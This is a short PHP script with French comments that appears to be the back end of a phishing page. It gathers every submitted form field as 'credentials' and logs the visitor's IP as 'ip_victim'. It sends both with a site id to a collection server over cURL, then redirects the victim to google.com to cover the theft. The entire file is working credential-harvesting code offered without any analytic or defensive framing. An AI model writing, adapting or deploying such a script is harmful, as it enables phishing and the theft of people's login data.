<?php

$url = "http://127.0.0.1:4000";
$ip_vicos = $_SERVER['REMOTE_ADDR'];

$siteIdPath = 'site_id.txt';
if (file_exists($siteIdPath)) {
    $siteId = file_get_contents($siteIdPath);
}
else{
    $siteId = "not specified >:(";
}

if ($_SERVER["REQUEST_METHOD"]==='POST'){
    $keys = $_POST;
    var_dump($keys);
}
if ($_SERVER["REQUEST_METHOD"]==='GET'){
    $keys = $_GET;
    var_dump($keys);    
}

$data = json_encode([
    'site_id' => $siteId,
    'credentials' => json_encode($keys),
    'ip_victim' => $ip_vicos
]);


// Initialisation de cURL
$ch = curl_init();

// Configuration des options de cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true); // Méthode POST
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); // Données envoyées
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Retourne la réponse en tant que chaîne
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data)
]);

// Exécution de la requête cURL
$response = curl_exec($ch);

// Vérification d'éventuelles erreurs
if(curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}

// Fermeture de la session cURL
curl_close($ch);

header('location:https://google.com');
exit();